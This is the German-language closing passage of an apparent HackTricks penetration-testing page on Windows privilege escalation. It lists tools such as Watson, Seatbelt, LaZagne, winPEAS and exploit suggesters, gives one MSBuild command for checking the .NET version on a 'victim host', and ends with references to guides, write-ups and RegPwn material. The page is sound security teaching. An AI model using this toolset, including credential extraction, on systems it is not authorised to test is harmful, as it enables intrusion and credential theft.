[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten privesc-Schwachstellen (muss mit VisualStudio kompiliert werden) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht das Host-System nach Fehlkonfigurationen (mehr ein Informationssammler als reines Privesc-Tool) (muss kompiliert werden) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldeinformationen aus vielen Programmen (vorkompiliertes exe auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (vorkompiliertes Executable auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (exe aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool basierend auf diesem Beitrag (benötigt accesschk nicht zwingend, kann es aber nutzen).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt passende Exploits (lokal, python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der korrekten .NET-Version kompilieren ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die installierte .NET-Version auf dem Opferhost zu sehen, kannst du folgendes tun:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referenzen

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)

{{#include ../../banners/hacktricks-training.md}}
